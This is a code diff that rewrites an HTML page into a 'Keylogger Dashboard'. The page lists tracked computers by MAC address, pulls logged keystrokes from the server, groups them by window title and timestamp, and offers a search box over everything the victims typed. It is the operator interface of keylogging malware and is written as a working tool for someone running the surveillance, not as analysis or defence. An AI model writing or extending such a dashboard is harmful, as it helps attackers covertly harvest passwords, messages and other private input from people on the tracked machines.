@@ -3,26 +3,121 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-    <link rel="stylesheet" href="./index.css">
+    <title>Keylogger Dashboard</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        body {
+            display: flex;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            height: 100vh;
+        }
+        .sidebar {
+            width: 250px;
+            background-color: #f0f0f0;
+            padding: 20px;
+            box-shadow: 2px 0 5px rgba(0,0,0,0.1);
+        }
+        .content {
+            flex-grow: 1;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        ul {
+            list-style: none;
+            padding: 0;
+        }
+        li {
+            padding: 10px;
+            cursor: pointer;
+            border-bottom: 1px solid #ddd;
+        }
+        li:hover {
+            background-color: #ddd;
+        }
+        .search-box {
+            width: 50%;
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+        .dropdown {
+            margin-bottom: 20px;
+        }
+    </style>
 </head>
 <body>
-    
-
-    <div class="container">
-        <h1>Keylogger Control</h1>
-        <button id="startBtn">Start Listening</button>
-        <button id="stopBtn">Stop Listening</button>
-        <div id="status"></div>
+    <div class="sidebar">
+        <h2>Tracked Windows</h2>
+        <select id="computer-list" class="dropdown" onchange="fetchWindows()">
+            <option value="">Select a tracked computer</option>
+        </select>
+        <ul id="windows-list"></ul>
     </div>
+    <div class="content">
+        <input type="text" class="search-box" placeholder="Search typed content..." oninput="searchContent(this.value)">
+        <h1 id="main-message">Select a tracked computer</h1>
+        <div id="log-content"></div>
+    </div>
+    <script>
+        let logData = {};
 
+        async function fetchComputers() {
+            const response = await fetch('/get_users');
+            const data = await response.json();
+            const computerList = document.getElementById('computer-list');
+            computerList.innerHTML = '<option value="">Select a tracked computer</option>';
+            for (const mac in data) {
+                const option = document.createElement('option');
+                option.value = mac;
+                option.textContent = mac;
+                computerList.appendChild(option);
+            }
+        }
 
+        async function fetchWindows() {
+            const selectedMac = document.getElementById('computer-list').value;
+            if (!selectedMac) return;
+            const response = await fetch('/get_data');
+            const data = await response.json();
+            logData = data[selectedMac] || {};
+            
+            const windowsList = document.getElementById('windows-list');
+            windowsList.innerHTML = '';
+            for (const window in logData) {
+                const li = document.createElement('li');
+                li.textContent = window;
+                li.onclick = () => displayContent(logData[window]);
+                windowsList.appendChild(li);
+            }
+            document.getElementById('main-message').textContent = 'Select a window to view keystrokes';
+        }
 
+        function displayContent(content) {
+            const logContent = document.getElementById('log-content');
+            logContent.innerHTML = JSON.stringify(content, null, 2);
+        }
 
+        function searchContent(query) {
+            if (!query) return;
+            let result = {};
+            for (const window in logData) {
+                for (const timestamp in logData[window]) {
+                    if (logData[window][timestamp].includes(query)) {
+                        if (!result[window]) result[window] = {};
+                        result[window][timestamp] = logData[window][timestamp];
+                    }
+                }
+            }
+            displayContent(result);
+        }
 
-
-
-
-    <script src="./index.js"></script>
+        fetchComputers();
+    </script>
 </body>
 </html>
